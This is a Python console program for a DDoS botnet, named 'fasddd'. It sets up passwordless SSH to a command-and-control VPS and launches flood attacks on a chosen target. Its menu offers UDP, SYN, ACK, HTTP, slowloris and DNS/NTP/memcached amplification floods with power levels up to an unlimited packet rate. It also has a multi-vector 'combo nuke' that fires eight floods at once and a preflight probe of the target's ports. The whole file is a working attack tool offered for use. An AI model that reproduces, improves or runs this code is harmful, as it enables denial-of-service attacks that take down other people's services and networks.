"""fasddd console controller - cmd-window app driving a remote VPS C2.

Features:
- 3D ANSI banner
- One-time SSH key setup (then passwordless)
- Auto-detects VPS cores / RAM / bandwidth on connect
- POWER LEVEL 1-10 selector that scales threads + rate cap
- Single-method fire OR multi-vector "combo nuke"
- Live throughput readout (pps + Gbit/s) every 2s
- Active-attacks list, stop one or stop all
- VPS preflight (resolves target, probes open ports from the VPS)
"""
from __future__ import annotations
import json
import os
import shutil
import subprocess
import sys
import threading
import time
from datetime import datetime
from pathlib import Path

# ---------------- ANSI ----------------
if os.name == "nt":
    os.system("")  # enable ANSI on Win10+

R   = "\033[0m"
B   = "\033[1m"
DIM = "\033[2m"
RED = "\033[91m"
GRN = "\033[92m"
YEL = "\033[93m"
BLU = "\033[94m"
MAG = "\033[95m"
CYN = "\033[96m"
GRY = "\033[90m"
WHT = "\033[97m"

CONFIG_PATH = Path(os.path.expandvars(r"%APPDATA%\fasddd\config.json"))
SSH_DIR = Path(os.path.expandvars(r"%USERPROFILE%\.ssh"))
KEY_PATH = SSH_DIR / "fasddd_ed25519"

METHODS = ["udp", "tcp", "syn", "ack", "http-get", "http-post",
           "slowloris", "dns-amp", "ntp-amp", "memcached"]

BANNER = r"""
{c1}  ███████╗ █████╗ ███████╗██████╗ ██████╗ ██████╗ {r}
{c2}  ██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗{r}
{c3}  █████╗  ███████║███████╗██║  ██║██║  ██║██║  ██║{r}
{c4}  ██╔══╝  ██╔══██║╚════██║██║  ██║██║  ██║██║  ██║{r}
{c5}  ██║     ██║  ██║███████║██████╔╝██████╔╝██████╔╝{r}
{c6}  ╚═╝     ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═════╝ ╚═════╝ {r}
"""

# ---------------- helpers ----------------

def cls():
    os.system("cls" if os.name == "nt" else "clear")


def banner():
    print(BANNER.format(
        c1=RED, c2=YEL, c3=GRN, c4=CYN, c5=BLU, c6=MAG, r=R
    ))
    print(f"  {DIM}exoticjailbreaks - VPS-side flood controller{R}\n")


def line(c=GRY, ch="-", n=78):
    print(c + ch * n + R)


def hud(cfg, vps, level, target, method):
    line(GRY, "=")
    print(f"  {B}VPS{R}     {GRN}{cfg['user']}@{cfg['host']}{R}   "
          f"cores={vps.get('cores','?')}  ram={vps.get('mem','?')}MB  "
          f"public={vps.get('ip','?')}")
    print(f"  {B}TARGET{R}  {RED}{target or '(not set)'}{R}   "
          f"method={method}   power=L{level} ({pct(level)}%)   "
          f"threads={threads_for(level, vps)}   rate={rate_for(level)}")
    line(GRY, "=")


def run_local(cmd: list[str], stdin_input: str | None = None, timeout: int = 60) -> tuple[int, str, str]:
    proc = subprocess.run(
        cmd,
        input=stdin_input,
        capture_output=True,
        text=True,
        timeout=timeout,
        creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
    )
    return proc.returncode, proc.stdout, proc.stderr


def load_config() -> dict | None:
    if CONFIG_PATH.exists():
        try:
            return json.loads(CONFIG_PATH.read_text())
        except Exception:
            return None
    return None


def save_config(cfg: dict):
    CONFIG_PATH.parent.mkdir(parents=True, exist_ok=True)
    CONFIG_PATH.write_text(json.dumps(cfg, indent=2))


def ensure_keypair():
    SSH_DIR.mkdir(parents=True, exist_ok=True)
    if KEY_PATH.exists():
        return
    rc, _, err = run_local(["ssh-keygen", "-t", "ed25519", "-f", str(KEY_PATH), "-N", "", "-q"])
    if rc != 0:
        raise RuntimeError(f"ssh-keygen failed: {err}")


def push_key(host: str, user: str, password: str, port: int = 22):
    try:
        import paramiko  # type: ignore
    except ImportError:
        print(f"{DIM}installing paramiko (one time)...{R}")
        run_local([sys.executable, "-m", "pip", "install", "--quiet", "paramiko"], timeout=240)
        import paramiko  # type: ignore

    pub = (KEY_PATH.with_suffix(".pub")).read_text().strip()
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    cli.connect(host, port=port, username=user, password=password, timeout=15,
                look_for_keys=False, allow_agent=False)
    try:
        for c in [
            "mkdir -p ~/.ssh", "chmod 700 ~/.ssh",
            f"grep -qxF '{pub}' ~/.ssh/authorized_keys 2>/dev/null || echo '{pub}' >> ~/.ssh/authorized_keys",
            "chmod 600 ~/.ssh/authorized_keys",
        ]:
            _, stdout, _ = cli.exec_command(c)
            stdout.channel.recv_exit_status()
    finally:
        cli.close()


def ssh_run(cfg, remote: str, timeout: int = 60) -> tuple[int, str, str]:
    args = [
        "ssh",
        "-i", str(KEY_PATH),
        "-p", str(cfg.get("port", 22)),
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=NUL" if os.name == "nt" else "UserKnownHostsFile=/dev/null",
        "-o", "BatchMode=yes",
        "-o", "ConnectTimeout=10",
        f"{cfg['user']}@{cfg['host']}",
        remote,
    ]
    return run_local(args, timeout=timeout)


# ---------------- power model ----------------

def pct(level: int) -> int:
    return max(10, min(100, level * 10))


def threads_for(level: int, vps: dict) -> int:
    cores = vps.get("cores") or 2
    cap = cores * 512
    if level >= 10:
        return cap
    base = max(16, int(cap * pct(level) / 100))
    return base


def rate_for(level: int) -> int:
    """pps cap per agent. 0 = unlimited (used at L9/L10)."""
    table = {1: 500, 2: 2000, 3: 5000, 4: 10000, 5: 25000,
             6: 50000, 7: 100000, 8: 250000, 9: 0, 10: 0}
    return table.get(level, 25000)


# ---------------- VPS profile ----------------

def detect_vps(cfg) -> dict:
    info = {"cores": None, "mem": None, "ip": cfg["host"]}
    rc, out, _ = ssh_run(cfg, "nproc; awk '/MemTotal/ {print int($2/1024)}' /proc/meminfo; curl -s -m 4 https://api.ipify.org || echo ?", timeout=15)
    if rc == 0:
        lines = [x.strip() for x in out.splitlines() if x.strip()]
        try:
            info["cores"] = int(lines[0])
            info["mem"]   = int(lines[1])
            if len(lines) > 2:
                info["ip"] = lines[2]
        except (IndexError, ValueError):
            pass
    return info


# ---------------- setup wizard ----------------

def setup_wizard() -> dict | None:
    cls(); banner()
    print(f"  {B}one-time setup{R}\n")
    host = input(f"  VPS host [37.114.46.81]: ").strip() or "37.114.46.81"
    user = input(f"  VPS user [root]: ").strip() or "root"
    port_s = input(f"  VPS SSH port [22]: ").strip() or "22"
    try:
        port = int(port_s)
    except ValueError:
        port = 22
    print(f"  VPS password (one-time, never stored): ", end="", flush=True)
    pw = input()
    if not (host and user and pw):
        print(f"  {RED}missing field. abort.{R}")
        return None
    try:
        print(f"\n  {DIM}generating key...{R}", flush=True)
        ensure_keypair()
        print(f"  {GRN}keypair: {KEY_PATH}{R}")
        print(f"  {DIM}pushing pubkey...{R}", flush=True)
        push_key(host, user, pw, port)
        cfg = {"host": host, "user": user, "port": port}
        rc, out, err = ssh_run(cfg, "echo ok && /root/status.sh 2>/dev/null | head -n 1", timeout=12)
        if rc != 0 or "ok" not in out:
            print(f"  {RED}verify failed: {err.strip() or out.strip()}{R}")
            return None
        save_config(cfg)
        print(f"  {GRN}saved {CONFIG_PATH}{R}")
        time.sleep(1)
        return cfg
    except Exception as exc:
        print(f"  {RED}error: {exc}{R}")
        input("\n  press enter to exit...")
        return None


# ---------------- live poller ----------------

class State:
    def __init__(self):
        self.agents = 0
        self.active = 0
        self.pps = 0.0
        self.bps = 0.0
        self.attacks: dict[str, dict] = {}
        self.stop_evt = threading.Event()

    def start_polling(self, cfg):
        def loop():
            while not self.stop_evt.is_set():
                try:
                    rc, out, _ = ssh_run(cfg,
                        "curl -sk https://127.0.0.1:4443/metrics | grep -E '^fasddd_(agents|attacks_active|total_pps|total_bps) '",
                        timeout=8)
                    if rc == 0:
                        for ln in out.splitlines():
                            try:
                                k, v = ln.split(" ", 1); v = float(v)
                            except Exception:
                                continue
                            if k == "fasddd_agents": self.agents = int(v)
                            elif k == "fasddd_attacks_active": self.active = int(v)
                            elif k == "fasddd_total_pps": self.pps = v
                            elif k == "fasddd_total_bps": self.bps = v
                    rc, out, _ = ssh_run(cfg, "/root/status.sh", timeout=8)
                    if rc == 0:
                        try:
                            self.attacks = json.loads(out).get("attacks", {})
                        except Exception:
                            pass
                except Exception:
                    pass
                self.stop_evt.wait(2)
        threading.Thread(target=loop, daemon=True).start()

    def stop(self): self.stop_evt.set()


# ---------------- actions ----------------

def fire_one(cfg, vps, target: str, method: str, port: int, secs: int, level: int) -> str | None:
    threads = threads_for(level, vps)
    rate = rate_for(level)
    cmd = f"/root/fire.sh {target} {secs} {method} {port} {threads} {rate}"
    print(f"  {DIM}> {cmd}{R}")
    rc, out, err = ssh_run(cfg, cmd, timeout=20)
    print(f"  {out.strip()}")
    if err.strip():
        print(f"  {RED}{err.strip()}{R}")
    if rc == 0:
        try:
            return json.loads(out).get("id")
        except Exception:
            return None
    return None


def combo_nuke(cfg, vps, target: str, secs: int, level: int) -> list[str]:
    """fire several methods at once - covers L3/L4/L7 vectors simultaneously."""
    print(f"\n  {RED}{B}>> COMBO NUKE: {target} for {secs}s at L{level}{R}\n")
    fires = [
        ("udp",      53),
        ("udp",      80),
        ("udp",      443),
        ("syn",      80),
        ("syn",      443),
        ("ack",      443),
        ("http-get", 80),
        ("http-get", 443),
    ]
    ids = []
    for m, p in fires:
        aid = fire_one(cfg, vps, target, m, p, secs, level)
        if aid:
            ids.append(aid)
    print(f"\n  {GRN}{len(ids)} attacks dispatched.{R}")
    return ids


def stop_all(cfg, state: State):
    ids = list(state.attacks.keys())
    if not ids:
        print(f"  {DIM}no active attacks.{R}"); return
    for aid in ids:
        rc, out, _ = ssh_run(cfg, f"/root/stop.sh {aid}", timeout=10)
        print(f"  stop {aid}: {out.strip()}")


def preflight(cfg, target: str):
    print(f"  {DIM}probing {target} from VPS...{R}")
    cmd = (
        f"echo --- ping --- && ping -c 3 -W 2 {target} | tail -n 3 ; "
        f"echo --- 80/tcp ---  && timeout 3 bash -c 'cat </dev/tcp/{target}/80'  2>&1 | head -n 1 ; "
        f"echo --- 443/tcp --- && timeout 3 bash -c 'cat </dev/tcp/{target}/443' 2>&1 | head -n 1 ; "
        f"echo --- 53/udp ---  && timeout 3 nslookup -timeout=2 google.com {target} 2>&1 | head -n 5 ; "
        f"echo --- traceroute --- && traceroute -n -m 8 {target} 2>/dev/null | tail -n 8"
    )
    _, out, _ = ssh_run(cfg, cmd, timeout=40)
    print(out)


# ---------------- main loop ----------------

def menu_loop(cfg, vps):
    state = State()
    state.start_polling(cfg)

    target = ""
    method = "udp"
    port = 53
    secs = 60
    level = 5

    while True:
        cls(); banner(); hud(cfg, vps, level, target, method)
        print(f"  {B}LIVE{R}    "
              f"agents={CYN}{state.agents}{R}  active={MAG}{state.active}{R}  "
              f"pps={GRN}{state.pps:,.0f}{R}  bps={GRN}{state.bps/1e9:,.3f} Gbit/s{R}")
        if state.attacks:
            print(f"\n  {B}active attacks:{R}")
            for aid, a in state.attacks.items():
                print(f"    {YEL}{aid}{R}  {a.get('target','')}  {a.get('method','')}  "
                      f"dur={a.get('duration','')}  agents={a.get('agents','')}")
        line(GRY, "-")
        print(f"  {B}[1]{R} target           {B}[2]{R} method ({method})       {B}[3]{R} port ({port})")
        print(f"  {B}[4]{R} seconds ({secs})    {B}[5]{R} power level (L{level})    {B}[6]{R} preflight")
        print(f"  {B}[F]{R} {RED}FIRE single{R}     {B}[N]{R} {RED}{B}COMBO NUKE{R}     "
              f"{B}[S]{R} stop all      {B}[R]{R} restart svcs")
        print(f"  {B}[L]{R} live tail        {B}[Q]{R} quit")
        line(GRY, "-")
        c = input("  > ").strip().lower()

        if c == "1":
            t = input("  target IP/host: ").strip()
            if t: target = t
        elif c == "2":
            for i, m in enumerate(METHODS, 1):
                print(f"    {i:2d}. {m}")
            sel = input("  method #: ").strip()
            try:
                method = METHODS[int(sel)-1]
            except Exception:
                pass
        elif c == "3":
            try: port = int(input("  port: ").strip())
            except Exception: pass
        elif c == "4":
            try: secs = int(input("  seconds: ").strip())
            except Exception: pass
        elif c == "5":
            try:
                lv = int(input("  power level (1-10, 10 = nuke): ").strip())
                level = max(1, min(10, lv))
            except Exception:
                pass
        elif c == "6":
            if not target:
                print(f"  {RED}set target first.{R}"); input("  press enter...")
                continue
            preflight(cfg, target); input("\n  press enter...")
        elif c == "f":
            if not target:
                print(f"  {RED}set target first.{R}"); input("  press enter...")
                continue
            fire_one(cfg, vps, target, method, port, secs, level)
            input("\n  press enter...")
        elif c == "n":
            if not target:
                print(f"  {RED}set target first.{R}"); input("  press enter...")
                continue
            combo_nuke(cfg, vps, target, secs, level)
            input("\n  press enter...")
        elif c == "s":
            stop_all(cfg, state); input("\n  press enter...")
        elif c == "r":
            print(f"  {DIM}restarting...{R}")
            ssh_run(cfg, "systemctl restart fasddd-c2 fasddd-agent", timeout=20)
            input("\n  press enter...")
        elif c == "l":
            print(f"  {DIM}tailing agent log (Ctrl+C to stop){R}")
            try:
                # interactive ssh - inherit stdio
                args = [
                    "ssh",
                    "-i", str(KEY_PATH),
                    "-p", str(cfg.get("port", 22)),
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "BatchMode=yes",
                    f"{cfg['user']}@{cfg['host']}",
                    "journalctl -u fasddd-agent -f -n 20",
                ]
                subprocess.run(args)
            except KeyboardInterrupt:
                pass
        elif c == "q":
            state.stop()
            print(f"  {DIM}bye{R}")
            return


# ---------------- entry ----------------

def main():
    cls(); banner()
    cfg = load_config()
    if not cfg:
        cfg = setup_wizard()
        if not cfg:
            return

    print(f"  {DIM}probing VPS...{R}")
    rc, out, err = ssh_run(cfg, "echo ok", timeout=10)
    if rc != 0 or "ok" not in out:
        print(f"  {RED}auth failed: {err.strip() or out.strip()}{R}")
        if input("  rerun setup? [y/N] ").strip().lower() == "y":
            cfg = setup_wizard()
            if not cfg: return
        else:
            return

    vps = detect_vps(cfg)
    print(f"  {GRN}VPS ok{R}: cores={vps['cores']} ram={vps['mem']}MB ip={vps['ip']}")
    time.sleep(1)
    menu_loop(cfg, vps)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n  {DIM}interrupted{R}")
